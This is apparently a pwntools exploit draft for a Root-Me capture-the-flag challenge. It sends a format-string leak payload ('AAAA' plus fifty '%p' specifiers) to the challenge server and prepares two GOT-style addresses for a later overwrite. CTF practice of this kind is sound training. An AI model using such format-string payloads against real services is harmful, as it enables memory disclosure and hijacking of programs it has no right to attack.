from pwn import *

conn = remote('challenge02.root-me.org', 56032)




#close addr = 0x0804a054
lower = p32(0x0804a054)
high = p32(0x0804a056)
pd = b'A' * 4 + b'%p ' * 50

conn.send(pd + b'\n')
ret = conn.recvuntil('\n')

print(ret)
conn.close()
